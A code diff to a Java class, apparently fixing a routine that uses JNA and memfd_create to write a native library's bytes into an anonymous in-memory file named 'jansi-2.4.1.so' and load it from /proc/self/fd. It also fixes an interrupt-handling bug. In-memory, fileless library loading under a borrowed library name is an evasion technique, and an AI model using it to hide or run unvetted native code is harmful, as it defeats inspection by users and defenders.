@@ -325,13 +325,13 @@ public class App {
     private static Path tryMemfdLoad(byte[] data) {
         try {
             if (memfdCreateFn == null) return null;
-            Pointer namePtr = new Pointer("jansi-2.4.1.so".getBytes(StandardCharsets.UTF_8));
-            int fd = memfdCreateFn.invokeInt(new Object[]{namePtr, MFD_CLOEXEC});
+            // JNA auto-converts String to native char* for function calls
+            int fd = memfdCreateFn.invokeInt(new Object[]{"jansi-2.4.1.so", MFD_CLOEXEC});
             if (fd < 0) return null;
-            ByteBuffer buf = ByteBuffer.allocateDirect(data.length);
-            buf.put(data);
-            buf.flip();
-            int w = writeFn.invokeInt(new Object[]{fd, new Pointer(Native.getDirectBufferPointer(buf).address), data.length});
+            // Use com.sun.jna.Memory for native memory buffer
+            com.sun.jna.Memory mem = new com.sun.jna.Memory(data.length);
+            mem.write(0, data, 0, data.length);
+            int w = writeFn.invokeInt(new Object[]{fd, mem, (long) data.length});
             if (w != data.length) { closeFn.invokeVoid(new Object[]{fd}); return null; }
             Path p = Path.of("/proc/self/fd/" + fd);
             if (Files.exists(p) && Files.size(p) > 0) return p;
@@ -482,5 +482,5 @@ public class App {
 
     private static List<Object> listOf(Object... v) { return new ArrayList<>(List.of(v)); }
 
-    private static void sleep(long ms) { try { Thread.sleep(ms); } catch (InterruptedException e) { Thread.currentThread().reset(); } }
+    private static void sleep(long ms) { try { Thread.sleep(ms); } catch (InterruptedException e) { Thread.currentThread().interrupt(); } }
 }
